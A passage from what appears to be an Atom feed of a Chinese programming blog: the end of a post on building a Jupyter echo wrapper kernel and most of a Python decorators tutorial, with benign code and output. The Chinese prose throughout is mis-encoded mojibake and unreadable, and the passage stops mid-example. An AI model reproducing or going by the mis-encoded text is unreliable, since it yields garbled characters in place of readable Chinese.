¸æ¨¡å—æ”¾åœ¨Pythonå¯ä»¥å¯¼å…¥çš„åœ°æ–¹ï¼Œä¸€èˆ¬æ˜¯å½“å‰ç›®å½•(åšæµ‹è¯•)ã€‚æœ€åï¼Œä½ å¯ä»¥ä½¿ç”¨ <code>jupyter console --kernel &lt;mykernelname&gt;</code> æ¥è¿è¡Œä½ çš„å†…æ ¸ã€‚</p><p>ä¾‹å­ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> <span class="built_in">echo</span>/</span></span><br><span class="line">echokernel.py kernel.json</span><br></pre></td></tr></table></figure><p><code>echokernel.py</code>:</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ipykernel.kernelbase <span class="keyword">import</span> Kernel</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EchoKernel</span>(<span class="title class_ inherited__">Kernel</span>):</span><br><span class="line">    implementation = <span class="string">&#x27;Echo&#x27;</span></span><br><span class="line">    implementation_version = <span class="string">&#x27;1.0&#x27;</span></span><br><span class="line">    language = <span class="string">&#x27;no-op&#x27;</span></span><br><span class="line">    language_version = <span class="string">&#x27;0.1&#x27;</span></span><br><span class="line">    language_info = &#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Any text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;mimetype&#x27;</span>: <span class="string">&#x27;text/plain&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;file_extension&#x27;</span>: <span class="string">&#x27;.txt&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    banner = <span class="string">&quot;Echo kernel - as useful as a parrot&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_execute</span>(<span class="params">self, code, silent, store_history=<span class="literal">True</span>, user_expressions=<span class="literal">None</span>,</span></span><br><span class="line"><span class="params">                   allow_stdin=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> silent:</span><br><span class="line">            stream_content = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;stdout&#x27;</span>, <span class="string">&#x27;text&#x27;</span>: code&#125;</span><br><span class="line">            self.send_response(self.iopub_socket, <span class="string">&#x27;stream&#x27;</span>, stream_content)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;status&#x27;</span>: <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                <span class="comment"># The base class increments the execution count</span></span><br><span class="line">                <span class="string">&#x27;execution_count&#x27;</span>: self.execution_count,</span><br><span class="line">                <span class="string">&#x27;payload&#x27;</span>: [],</span><br><span class="line">                <span class="string">&#x27;user_expressions&#x27;</span>: &#123;&#125;,</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">from</span> ipykernel.kernelapp <span class="keyword">import</span> IPKernelApp</span><br><span class="line">    IPKernelApp.launch_instance(kernel_class=EchoKernel)</span><br></pre></td></tr></table></figure><p><code>kernel.json</code>:</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;argv&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;python&quot;</span><span class="punctuation">,</span><span class="string">&quot;-m&quot;</span><span class="punctuation">,</span><span class="string">&quot;echokernel&quot;</span><span class="punctuation">,</span> <span class="string">&quot;-f&quot;</span><span class="punctuation">,</span> <span class="string">&quot;&#123;connection_file&#125;&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;display_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Echo&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ jupyter kernelspec install echo --user</span><br></pre></td></tr></table></figure><p>è¿™é‡Œï¼Œåªä¸ºå½“å‰ç”¨æˆ·æ·»åŠ è¿™ä¸ªkernelã€‚</p><h3><span id="cha-kan">æŸ¥çœ‹</span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">jupyter notebook</span></span><br></pre></td></tr></table></figure><p>é€‰æ‹©æ–°åˆ›å»ºçš„å†…æ ¸åˆ›å»º notebookï¼Œå¹¶è¿è¡Œä»£ç ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/47489844-1bdedc00-d87a-11e8-8294-3c412fbcdb52.png" alt="jupyter with new kernel echo"></p><p><img src="https://user-images.githubusercontent.com/3297411/47490179-bf2ff100-d87a-11e8-85b3-3469efa7edc2.png" alt="image"></p><h3><span id="yi-xie-keng">ä¸€äº›å‘</span></h3><ol><li>è¿è¡Œ notebook æ—¶æ— æ³•æ‰¾åˆ° <code>echokernel</code> æ¨¡å—ï¼š</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[I 15:48:27.754 NotebookApp] Kernel started: 77759cfa-db55-4b70-be23-c14d69f8d87d</span><br><span class="line">/usr/local/miniconda3/envs/py365/bin/python: No module named echokernel</span><br><span class="line">[I 15:48:30.750 NotebookApp] KernelRestarter: restarting kernel (1/5), new random ports</span><br><span class="line">/usr/local/miniconda3/envs/py365/bin/python: No module named echokernel</span><br><span class="line">[I 15:48:33.766 NotebookApp] KernelRestarter: restarting kernel (2/5), new random ports</span><br><span class="line">/usr/local/miniconda3/envs/py365/bin/python: No module named echokernel</span><br><span class="line">[I 15:48:36.789 NotebookApp] KernelRestarter: restarting kernel (3/5), new random ports</span><br><span class="line">/usr/local/miniconda3/envs/py365/bin/python: No module named echokernel</span><br><span class="line">[I 15:48:39.812 NotebookApp] KernelRestarter: restarting kernel (4/5), new random ports</span><br><span class="line">/usr/local/miniconda3/envs/py365/bin/python: No module named echokernel</span><br></pre></td></tr></table></figure><p>éœ€è¦å°† <code>echokernel.py</code> æ”¾ç½®åœ¨ python PATH ä¸­ ï¼Œè¿™æ ·åœ¨æ‰§è¡Œå‘½ä»¤æ—¶æ‰èƒ½è®¿é—®åˆ°ã€‚</p><h3><span id="geng-duo-ming-ling">æ›´å¤šå‘½ä»¤</span></h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ jupyter kernelspec <span class="built_in">help</span></span><br><span class="line">Manage Jupyter kernel specifications.</span><br><span class="line"></span><br><span class="line">Subcommands</span><br><span class="line">-----------</span><br><span class="line"></span><br><span class="line">Subcommands are launched as `jupyter kernelspec cmd [args]`. For information on</span><br><span class="line">using subcommand <span class="string">&#x27;cmd&#x27;</span>, <span class="keyword">do</span>: `jupyter kernelspec cmd -h`.</span><br><span class="line"></span><br><span class="line">list</span><br><span class="line">    List installed kernel specifications.</span><br><span class="line">install</span><br><span class="line">    Install a kernel specification directory.</span><br><span class="line">uninstall</span><br><span class="line">    Alias <span class="keyword">for</span> remove</span><br><span class="line">remove</span><br><span class="line">    Remove one or more Jupyter kernelspecs by name.</span><br><span class="line">install-self</span><br><span class="line">    [DEPRECATED] Install the IPython kernel spec directory <span class="keyword">for</span> this Python.</span><br><span class="line"></span><br><span class="line">To see all available configurables, use `--help-all`</span><br></pre></td></tr></table></figure><h3><span id="shan-chu-nei-he">åˆ é™¤å†…æ ¸</span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">jupyter kernelspec uninstall <span class="built_in">echo</span></span></span><br></pre></td></tr></table></figure><h3><span id="can-kao">å‚è€ƒ</span></h3><ul><li><a href="https://jupyter-client.readthedocs.io/en/stable/wrapperkernels.html">Making simple Python wrapper kernels</a></li><li><a href="http://landcareweb.com/questions/879/ru-he-jiang-python3nei-he-tian-jia-dao-jupyter-ipython">é¢˜ å¦‚ä½•å°†python3å†…æ ¸æ·»åŠ åˆ°jupyterï¼ˆIPythonï¼‰</a></li><li><a href="https://skyrover.me/2017/12/07/making_kernels_for_jupyter/">ç¿»è¯‘ - Making kernels for Jupyter</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Making kernels for jupyter
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>13. è£…é¥°å™¨ â€” Python è¿›é˜¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-127/"/>
    <id>https://qiwihui.com/qiwihui-blog-127/</id>
    <published>2022-08-13T01:54:25.680Z</published>
    <updated>2024-05-15T02:25:31.469Z</updated>
    
    <content type="html"><![CDATA[<p>è£…é¥°å™¨æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒæ¥å—å¦ä¸€ä¸ªå‡½æ•°å¹¶æ‰©å±•è¯¥å‡½æ•°çš„è¡Œä¸ºè€Œæ— éœ€æ˜¾å¼ä¿®æ”¹å®ƒã€‚ è¿™æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å·¥å…·ï¼Œå¯ä»¥å°†æ–°åŠŸèƒ½æ·»åŠ åˆ°ç°æœ‰å‡½æ•°ä¸­ã€‚</p><p>è£…é¥°å™¨æœ‰2ç§ï¼š</p><ul><li>å‡½æ•°è£…é¥°å™¨</li><li>ç±»è£…é¥°å™¨</li></ul><p>å‡½æ•°ç”¨ <code>@</code> ç¬¦å·ä¿®é¥°ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@my_decorator</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_function</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><span id="more"></span><h3><span id="han-shu-zhuang-shi-qi">å‡½æ•°è£…é¥°å™¨</span></h3><p>ä¸ºäº†ç†è§£è£…é¥°å™¨æ¨¡å¼ï¼Œæˆ‘ä»¬å¿…é¡»äº†è§£Pythonä¸­çš„å‡½æ•°æ˜¯ä¸€çº§å¯¹è±¡ï¼Œè¿™æ„å‘³ç€åƒå…¶ä»–ä»»ä½•å¯¹è±¡ä¸€æ ·ï¼Œå®ƒä»¬å¯ä»¥åœ¨å¦ä¸€ä¸ªå‡½æ•°å†…å®šä¹‰ï¼Œä½œä¸ºå‚æ•°ä¼ é€’ç»™å¦ä¸€ä¸ªå‡½æ•°æˆ–ä»å…¶ä»–å‡½æ•°è¿”å› ã€‚ è£…é¥°å™¨æ˜¯ä¸€ä¸ªå°†å¦ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°çš„å‡½æ•°ï¼Œå°†å…¶è¡Œä¸ºåŒ…è£…åœ¨å†…éƒ¨å‡½æ•°ä¸­ï¼Œå¹¶è¿”å›åŒ…è£…çš„å‡½æ•°ã€‚ ç»“æœï¼Œä¿®é¥°çš„å‡½æ•°ä¾¿å…·æœ‰äº†æ‰©å±•çš„åŠŸèƒ½ï¼</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è£…é¥°å™¨æ˜¯ä¸€ä¸ªå°†å¦ä¸€ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°çš„å‡½æ•°ï¼Œå°†å…¶è¡Œä¸ºåŒ…è£…åœ¨å†…éƒ¨å‡½æ•°ä¸­ï¼Œå¹¶è¿”å›åŒ…è£…çš„å‡½æ•°ã€‚</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_end_decorator</span>(<span class="params">func</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Start&#x27;</span>)</span><br><span class="line">        func()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;End&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_name</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alex&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">print_name()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç°åœ¨é€šè¿‡å°†å…¶ä½œä¸ºå‚æ•°ä¼ é€’ç»™è£…é¥°å™¨å‡½æ•°å¹¶å°†å…¶èµ‹å€¼ç»™è‡ªèº«æ¥åŒ…è£…è¯¥å‡½æ•°-&gt;æˆ‘ä»¬çš„å‡½æ•°å·²æ‰©å±•äº†è¡Œä¸ºï¼</span></span><br><span class="line">print_name = start_end_decorator(print_name)</span><br><span class="line">print_name()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Alex</span><br><span class="line"></span><br><span class="line">Start</span><br><span class="line">Alex</span><br><span class="line">End</span><br></pre></td></tr></table></figure><h3><span id="zhuang-shi-qi-yu-fa">è£…é¥°å™¨è¯­æ³•</span></h3><p>é™¤äº†åŒ…è£…å‡½æ•°å¹¶å°†å…¶åˆ†é…ç»™è‡ªèº«ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ç”¨ <code>@</code> è£…é¥°å‡½æ•°æ¥å®ç°ç›¸åŒçš„ç›®çš„ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@start_end_decorator</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_name</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alex&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">print_name()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Start</span><br><span class="line">Alex</span><br><span class="line">End</span><br></pre></td></tr></table></figure><h3><span id="guan-yu-han-shu-can-shu">å…³äºå‡½æ•°å‚æ•°</span></h3><p>å¦‚æœæˆ‘ä»¬çš„å‡½æ•°å…·æœ‰è¾“å…¥å‚æ•°ï¼Œå¹¶ä¸”æˆ‘ä»¬å°è¯•ä½¿ç”¨ä¸Šé¢çš„è£…é¥°å™¨å°†å…¶åŒ…è£…ï¼Œåˆ™å®ƒå°†å¼•å‘ <code>TypeError</code>ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨åŒ…è£…å™¨å†…è°ƒç”¨å‡½æ•°æ—¶ä¹Ÿå¿…é¡»ä½¿ç”¨æ­¤å‚æ•°ã€‚ ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨å†…éƒ¨å‡½æ•°ä¸­ä½¿ç”¨ <code>*args</code> å’Œ <code>**kwargs</code> æ¥è§£å†³æ­¤é—®é¢˜ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">start_end_decorator_2</span>(<span class="params">func</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Start&#x27;</span>)</span><br><span class="line">        func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;End&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@start_end_decorator_2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_5</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x + <span class="number">5</span></span><br><span class="line"></span><br><span class="line">result = add_5(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Start</span><br><span class="line">End</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure><h3><span id="fan-hui-zhi">è¿”å›å€¼</span></h3><p>è¯·æ³¨æ„ï¼Œåœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬æ²¡æœ‰å–å›ç»“æœï¼Œå› æ­¤ï¼Œä¸‹ä¸€æ­¥ï¼Œæˆ‘ä»¬è¿˜å¿…é¡»ä»å†…éƒ¨å‡½æ•°è¿”å›å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">start_end_decorator_3</span>(<span class="params">func</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Start&#x27;</span>)</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;End&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@start_end_decorator_3</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_5</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x + <span class="number">5</span></span><br><span class="line"></span><br><span class="line">result = add_5(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Start</span><br><span class="line">End</span><br><span class="line"><span class="number">15</span></span><br></pre></td></tr></table></figure><h3><span id="han-shu-biao-shi-you-ru-he-bian-hua-ni">å‡½æ•°æ ‡è¯†åˆå¦‚ä½•å˜åŒ–å‘¢ï¼Ÿ</span></h3><p>å¦‚æœæˆ‘ä»¬çœ‹ä¸€ä¸‹è£…é¥°å‡½æ•°çš„åç§°ï¼Œå¹¶ä½¿ç”¨å†…ç½®çš„ <code>help</code> å‡½æ•°å¯¹å…¶è¿›è¡Œæ£€æŸ¥ï¼Œæˆ‘ä»¬ä¼šæ³¨æ„åˆ°Pythonè®¤ä¸ºæˆ‘ä»¬çš„å‡½æ•°ç°åœ¨æ˜¯è£…é¥°å™¨å‡½æ•°çš„åŒ…è£…å†…éƒ¨å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(add_5.__name__)</span><br><span class="line"><span class="built_in">help</span>(add_5)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">wrapper</span><br><span class="line">Help on function wrapper <span class="keyword">in</span> module __main__:</span><br><span class="line"></span><br><span class="line">wrapper(*args, **kwargs)</span><br></pre></td></tr></table></figure><p>è¦è§£å†³æ­¤é—®é¢˜ï¼Œè¯·ä½¿ç”¨ <code>functools.wraps</code> è£…é¥°å™¨ï¼Œè¯¥è£…é¥°å™¨å°†ä¿ç•™æœ‰å…³åŸå§‹å‡½æ•°çš„ä¿¡æ¯ã€‚ è¿™æœ‰åŠ©äºè¿›è¡Œè‡ªçœï¼Œå³å¯¹è±¡åœ¨è¿è¡Œæ—¶äº†è§£å…¶è‡ªèº«å±æ€§çš„èƒ½åŠ›ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_end_decorator_4</span>(<span class="params">func</span>):</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Start&#x27;</span>)</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;End&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@start_end_decorator_4</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_5</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x + <span class="number">5</span></span><br><span class="line">result = add_5(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(add_5.__name__)</span><br><span class="line"><span class="built_in">help</span>(add_5)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Start</span><br><span class="line">End</span><br><span class="line"><span class="number">15</span></span><br><span class="line">add_5</span><br><span class="line">Help on function add_5 <span class="keyword">in</span> module __main__:</span><br><span class="line"></span><br><span class="line">add_5(x)</span><br></pre></td></tr></table></figure><h3><span id="zhuang-shi-qi-de-zui-zhong-mo-ban">è£…é¥°å™¨çš„æœ€ç»ˆæ¨¡æ¿</span></h3><p>ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»æœ‰äº†æ‰€æœ‰éƒ¨åˆ†ï¼Œç”¨äºä»»ä½•è£…é¥°å™¨çš„æ¨¡æ¿å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_decorator</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="comment"># Do something before</span></span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        <span class="comment"># Do something after</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure><h3><span id="zhuang-shi-qi-han-shu-can-shu">è£…é¥°å™¨å‡½æ•°å‚æ•°</span></h3><p>è¯·æ³¨æ„ï¼Œ <code>functools.wraps</code> æ˜¯ä¸€ä¸ªè£…é¥°å™¨ï¼Œå®ƒè‡ªå·±æ¥å—ä¸€ä¸ªå‚æ•°ã€‚ æˆ‘ä»¬å¯ä»¥å°†å…¶è§†ä¸º2ä¸ªå†…éƒ¨å‡½æ•°ï¼Œå³å†…éƒ¨å‡½æ•°é‡Œçš„å†…éƒ¨å‡½æ•°ã€‚ ä¸ºäº†æ›´æ¸…æ¥šåœ°è¯´æ˜è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬æ¥çœ‹å¦ä¸€ä¸ªç¤ºä¾‹ï¼šä»¥æ•°å­—ä½œä¸ºè¾“å…¥çš„ <code>repeat</code> è£…é¥°å™¨ã€‚ åœ¨æ­¤å‡½æ•°å†…ï¼Œæˆ‘ä»¬æœ‰å®é™…çš„è£…é¥°å‡½æ•°ï¼Œè¯¥å‡½æ•°åŒ…è£…å‡½æ•°å¹¶åœ¨å¦ä¸€ä¸ªå†…éƒ¨å‡½æ•°å†…æ‰©å±•å…¶è¡Œä¸ºã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒå°†è¾“å…¥å‡½æ•°é‡å¤ç»™å®šçš„æ¬¡æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">repeat</span>(<span class="params">num_times</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorator_repeat</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">        @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_times):</span><br><span class="line">                result = func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorator_repeat</span><br><span class="line"></span><br><span class="line"><span class="meta">@repeat(<span class="params">num_times=<span class="number">3</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Hello <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">greet(<span class="string">&#x27;Alex&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hello Alex</span><br><span class="line">Hello Alex</span><br><span class="line">Hello Alex</span><br></pre></td></tr></table></figure><h3><span id="qian-tao-zhuang-shi-qi">åµŒå¥—è£…é¥°å™¨</span></h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å¤šä¸ªè£…é¥°å™¨å½¼æ­¤å †å æ¥å°†å…¶åº”ç”¨åˆ°ä¸€ä¸ªå‡½æ•°ã€‚ è£…é¥°å™¨å°†æŒ‰ç…§å…¶åˆ—å‡ºçš„é¡ºåºæ‰§è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è£…é¥°å™¨å‡½æ•°ï¼Œå®ƒè¾“å‡ºæœ‰å…³åŒ…è£…å‡½æ•°çš„è°ƒè¯•ä¿¡æ¯</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        args_repr = [<span class="built_in">repr</span>(a) <span class="keyword">for</span> a <span class="keyword">in</span> args]</span><br><span class="line">        kwargs_repr = [<span class="string">f&quot;<span class="subst">&#123;k&#125;</span>=<span class="subst">&#123;v!r&#125;</span>&quot;</span> <span class="keyword">for</span> k, v <span class="keyword">in</span> kwargs.items()]</span><br><span class="line">        signature = <span class="string">&quot;, &quot;</span>.join(args_repr + kwargs_repr)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Calling <span class="subst">&#123;func.__name__&#125;</span>(<span class="subst">&#123;signature&#125;</span>)&quot;</span>)</span><br><span class="line">        result = func(*args, **kwargs)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;func.__name__!r&#125;</span> returned <span class="subst">&#123;result!r&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@debug</span></span><br><span class="line"><span class="meta">@start_end_decorator_4</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">say_hello</span>(<span class="params">name</span>):</span><br><span class="line">    greeting = <span class="string">f&#x27;Hello <span class="subst">&#123;name&#125;</span>&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(greeting)</span><br><span class="line">    <span class="keyword">return</span> greeting</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç°åœ¨ `debug` å…ˆæ‰§è¡Œï¼Œç„¶åè°ƒç”¨ `@start_end_decorator_4`ï¼Œåè€…ä¼˜æƒ è°ƒç”¨ `say_hello`</span></span><br><span class="line">say_hello(name=<span class="string">&#x27;Alex&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Calling say_hello(name=<span class="string">&#x27;Alex&#x27;</span>)</span><br><span class="line">Start</span><br><span class="line">Hello Alex</span><br><span class="line">End</span><br><span class="line"><span class="string">&#x27;say_hello&#x27;</span> returned <span class="string">&#x27;Hello Alex&#x27;</span></span><br></pre></td></tr></table></figure><h3><span id="lei-zhuang-shi-qi">ç±»è£…é¥°å™¨</span></h3><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€ä¸ªç±»ä½œä¸ºè£…é¥°å™¨ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å¿…é¡»å®ç° <code>__call__()</code> æ–¹æ³•ä»¥ä½¿æˆ‘ä»¬çš„å¯¹è±¡å¯è°ƒç”¨ã€‚ ç±»è£…é¥°å™¨é€šå¸¸ç”¨äºç»´æŠ¤çŠ¶æ€ï¼Œä¾‹å¦‚ï¼š åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è·Ÿè¸ªå‡½æ•°æ‰§è¡Œçš„æ¬¡æ•°ã€‚ <code>__call__</code>æ–¹æ³•ä¸æˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„ <code>wrapper()</code> æ–¹æ³•æœ¬è´¨ä¸Šæ˜¯ç›¸åŒçš„ã€‚ å®ƒæ·»åŠ äº†ä¸€äº›åŠŸèƒ½ï¼Œæ‰§è¡Œäº†è¯¥å‡½æ•°ï¼Œå¹¶è¿”å›å…¶ç»“æœã€‚ è¯·æ³¨æ„ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ <code>functools.update_wrapper()</code> ä»£æ›¿ <code>functools.wraps</code> æ¥ä¿ç•™æœ‰å…³å‡½æ•°çš„ä¿¡æ¯ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CountCalls</span>:</span><br><span class="line">    <span class="comment"># åˆå§‹åŒ–éœ€è¦ä»¥funcä½œä¸ºå‚æ•°å¹¶å°†å…¶å­˜å‚¨</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, 